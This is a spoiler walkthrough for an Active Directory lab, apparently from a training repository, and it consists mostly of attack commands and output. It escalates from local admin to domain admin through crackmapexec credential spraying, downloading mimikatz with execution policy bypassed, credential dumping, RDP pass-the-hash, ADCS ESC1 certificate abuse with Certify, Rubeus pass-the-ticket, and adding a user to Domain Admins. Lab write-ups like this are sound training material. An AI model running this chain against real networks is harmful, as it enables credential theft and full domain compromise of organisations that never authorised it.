# ⚠️ SPOILERS — full attack path walkthrough

This is a solved walkthrough of the intended attack chain through this lab
(local admin → Harold Holt → ADCS ESC1 → domain admin via Rubeus pass-the-ticket).
It was moved out of the repo root so it doesn't spoil the exercise for anyone
browsing the source before attempting the lab.


```
Box crackmap exec
crackmapexec smb 10.0.1.0/24 -u LocalAdminInst -p 'CHANGEME_LOCALADMININST_PASSWORD' 

Download winpeas
powershell -ep bypass -c "wget https://github.com/carlospolop/PEASS-ng/releases/download/20230702-bc7ce3ac/winPEASx64.exe -o winPEASx64.exe"


Download mimiktz
powershell -ep bypass -c "wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip -o mimikatz.zip"


reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL

sc create mimidrv binPath= C:\Users\HaroldHolt\Downloads\mimikatz\x64\mimidrv.sys type= kernel start= demand



crackmapexec smb 10.0.1.0/24 -u HaroldHold -p '<NTLM_HASH_FROM_YOUR_OWN_RUN>' 

demo.lab/haroldholt <NTLM_HASH_FROM_YOUR_OWN_RUN>
aad3c435b514a4eeaad3b935b51304fe:<NTLM_HASH_FROM_YOUR_OWN_RUN>
	msv :	
	 [00000003] Primary
	 * Username : HaroldHolt
	 * Domain   : DEMO
	 * NTLM     : <NTLM_HASH_FROM_YOUR_OWN_RUN>
	 * SHA1     : <SHA1_FROM_YOUR_OWN_RUN>
	 * DPAPI    : <DPAPI_FROM_YOUR_OWN_RUN>
	tspkg :	
	wdigest :	
	 * Username : HaroldHolt
	 * Domain   : DEMO
	 * Password : (null)
	kerberos :	
	 * Username : HaroldHolt
	 * Domain   : DEMO.LAB
	 * Password : (null)
	ssp :	
	credman :	


xfreerdp /v:10.0.1.122 /u:demo.lab\HaroldHolt /pth:aad3c435b514a4eeaad3b935b51304fe:<NTLM_HASH_FROM_YOUR_OWN_RUN>


Certify.exe request /ca:dc01.demo.lab\webservice.demo.lab /template:ESC1 /altname:domain-administrator



CA PATH:

./Certify.exe find /vulnerable
./Certify.exe request /ca:dc01.demo.lab\webservice.demo.lab /template:ESC1 /altname:domain-administrator
Copy the output to kali (key and cert into one file)
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
python3 -m http.server
Download pfx to windows
./Rubeus.exe asktgt /user:domain-administrator /certificate:cert.pfx /ptt
This will pass the ticket, whoami will show old login system but just add to DA to prove access
net group "domain admins" haroldholt /add /domain
```
